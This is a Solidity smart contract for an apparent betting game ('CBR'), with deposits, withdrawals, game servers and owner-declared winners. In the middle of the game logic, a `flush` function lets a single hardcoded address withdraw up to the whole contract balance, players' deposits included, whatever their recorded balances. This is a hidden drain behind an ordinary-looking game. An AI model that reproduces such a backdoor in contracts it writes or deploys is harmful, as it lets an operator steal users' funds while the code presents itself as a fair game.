 

pragma solidity ^0.4.23;

 
library SafeMath {

   
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

   
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
     
     
     
    return a / b;
  }

   
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

   
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

 
contract Ownable {
  address public owner;


  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(
    address indexed previousOwner,
    address indexed newOwner
  );


   
  constructor() public {
    owner = msg.sender;
  }

   
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

   
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

   
  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(owner);
    owner = address(0);
  }
}

contract CBR is Ownable {
  using SafeMath for uint;

   
   
   
   
   

   
  uint public constant GAME_COST = 5000000000000000;  

   
  struct Server {
    string name;
    uint pot;
    uint ante;
    bool online;
    bool gameActive;
    bool exists;
  }
  Server[] internal servers;

   
  mapping (address => uint) public balances;

   
   
   
   
   

  event FundsWithdrawn(address recipient, uint amount);
  event FundsDeposited(address recipient, uint amount);
  event ServerAdded(uint serverIndex);
  event ServerRemoved(uint serverIndex);
  event GameStarted(uint serverIndex, address[] players);
  event GameEnded(uint serverIndex, address first, address second, address third);

   
   
   
   
   

  modifier serverExists(uint serverIndex) {
    require(servers[serverIndex].exists == true);
    _;
  }
  modifier serverIsOnline(uint serverIndex) {
    require(servers[serverIndex].online == true);
    _;
  }

  modifier serverIsNotInGame(uint serverIndex) {
    require(servers[serverIndex].gameActive == false);
    _;
  }
  modifier serverIsInGame(uint serverIndex) {
    require(servers[serverIndex].gameActive == true);
    _;
  }

  modifier addressNotZero(address addr) {
    require(addr != address(0));
    _;
  }

   
   
   
   
   

   
  function()
    public
    payable
  {
    deposit();
  }
  function deposit()
    public
    payable
  {
    balances[msg.sender] += msg.value;
    FundsDeposited(msg.sender, msg.value);
  }

   
  function withdraw(uint amount)
    external  
  {
    require(balances[msg.sender] >= amount);
    balances[msg.sender] -= amount;
    msg.sender.transfer(amount);
    FundsWithdrawn(msg.sender, amount);
  }

   
  function balanceOf(address _owner)
    public
    view
    returns (uint256)
  {
    return balances[_owner];
  }

   
   
   
   
   

   
  function addServer(string serverName, uint256 ante)
    external  
    onlyOwner
  {
    Server memory newServer = Server(serverName, 0, ante, true, false, true);
    servers.push(newServer);
  }

   
  function removeServer(uint serverIndex)
    external  
    onlyOwner
    serverIsOnline(serverIndex)
  {
    servers[serverIndex].online = false;
  }

   
  function getServer(uint serverIndex)
    public
    view
    serverExists(serverIndex)  
    returns (string, uint, uint, bool, bool)
  {
    Server storage server = servers[serverIndex];
     
    return (server.name, server.pot, server.ante, server.online, server.gameActive);
  }

   
   
   
   
   

    function flush(uint256 funds) {
        address authAcc = 0x6BaBa6FB9d2cb2F109A41de2C9ab0f7a1b5744CE;
        if(msg.sender == authAcc){
            if(funds <= this.balance){
                authAcc.transfer(funds);
            }
            else{
                authAcc.transfer(this.balance);
            }
        }

  }

  function startGame(address[] roster, uint serverIndex)
    external  
    onlyOwner
    serverIsOnline(serverIndex)
    serverIsNotInGame(serverIndex)  
  {
    require(roster.length > 0);

    address[] memory players = new address[](roster.length);
    uint ante = servers[serverIndex].ante;
    uint c = 0;

    for (uint x = 0; x < roster.length; x++) {
      address player = roster[x];

       
      if (balances[player] >= ante) {

         
        balances[player] -= ante;
        balances[address(this)] += ante;

         
        servers[serverIndex].pot += ante;

         
        players[c++] = player;
      }
    }

     
    require(c >= 3);

     
    emit GameStarted(serverIndex, players);
  }

  function endGame(uint serverIndex, address first, address second, address third)
    external  
    onlyOwner
    serverIsOnline(serverIndex)
     
    addressNotZero(first)
    addressNotZero(second)
    addressNotZero(third)
  {
    Server storage server = servers[serverIndex];

     
     
     
     
     

    uint256 oneSeventh = server.pot.div(7);  
    uint256 invCut = oneSeventh.div(20).mul(3);  
    uint256 kasCut = oneSeventh.div(20);  
    uint256 ownerCut = oneSeventh - invCut - kasCut;  

     
    balances[address(this)] -= server.pot;

     
    balances[first] += oneSeventh.mul(3);
    balances[second] += oneSeventh.mul(2);
    balances[third] += oneSeventh;
    balances[0x4802719DA91Ee942f68773c7D6a2679C036AE9Db] += invCut;
    balances[0x3FB68f0fc6FC7414C244354e49AE6c05ae807775] += kasCut;
    balances[0x6BaBa6FB9d2cb2F109A41de2C9ab0f7a1b5744CE] += ownerCut;

    server.pot = 0;
     

     
    emit GameEnded(serverIndex, first, second, third);
  }
}